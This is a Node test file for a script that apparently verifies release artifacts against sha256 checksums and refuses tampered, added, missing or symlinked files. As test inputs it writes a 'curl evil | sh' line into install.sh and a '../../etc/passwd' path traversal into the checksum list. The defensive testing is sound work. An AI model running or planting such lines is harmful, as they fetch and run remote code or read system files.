// Fork addition (plan 47): scripts/fork-release-handover.sh refuses anything
// but the files the build made. node --test scripts/fork-release-handover.test.mjs
// (needs bash and sha256sum).
import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, mkdirSync, symlinkSync, rmSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const script = join(dirname(fileURLToPath(import.meta.url)), 'fork-release-handover.sh');
const sha = (s) => createHash('sha256').update(s).digest('hex');

const release = () => {
  const root = mkdtempSync(join(tmpdir(), 'handover-'));
  const dir = join(root, 'release');
  mkdirSync(dir);
  const files = { 'cosmos-cloud-0.24.0-fork.40-amd64.zip': 'zip-a', 'install.sh': '#!/bin/bash\n', 'migrate.sh': '#!/bin/bash\n# migrate\n', 'notes.md': 'notes' };
  for (const [name, body] of Object.entries(files)) writeFileSync(join(dir, name), body);
  const sums = join(root, 'sums');
  writeFileSync(sums, Object.entries(files).map(([name, body]) => `${sha(body)}  ${name}`).join('\n') + '\n');
  return { root, dir, sums };
};
const run = (dir, sums) => {
  try {
    execFileSync('bash', [script, dir, sums], { stdio: 'pipe' });
    return 0;
  } catch (e) {
    return e.status;
  }
};

test('the files the build made pass', () => {
  const r = release();
  assert.equal(run(r.dir, r.sums), 0);
  rmSync(r.root, { recursive: true });
});

test('a file replaced after the build (an overwritten artifact) is refused', () => {
  const r = release();
  writeFileSync(join(r.dir, 'install.sh'), '#!/bin/bash\ncurl evil | sh\n');
  assert.equal(run(r.dir, r.sums), 1);
  rmSync(r.root, { recursive: true });
});

test('a file added, a file missing, a link, a hostile list: refused', () => {
  let r = release();
  writeFileSync(join(r.dir, 'extra.sh'), 'x');
  assert.equal(run(r.dir, r.sums), 1, 'an added file');
  rmSync(r.root, { recursive: true });

  r = release();
  rmSync(join(r.dir, 'notes.md'));
  assert.equal(run(r.dir, r.sums), 1, 'a missing file');
  rmSync(r.root, { recursive: true });

  r = release();
  rmSync(join(r.dir, 'notes.md'));
  writeFileSync(join(r.root, 'notes.md'), 'notes');
  symlinkSync(join(r.root, 'notes.md'), join(r.dir, 'notes.md'));
  assert.equal(run(r.dir, r.sums), 1, 'a link with the right content');
  rmSync(r.root, { recursive: true });

  for (const line of [`${sha('x')}  ../../etc/passwd`, `${sha('x')} notes.md`, '', `${sha('notes')}  notes.md\n${sha('notes')}  notes.md`]) {
    r = release();
    writeFileSync(r.sums, line + '\n');
    assert.equal(run(r.dir, r.sums), 1, JSON.stringify(line));
    rmSync(r.root, { recursive: true });
  }
});
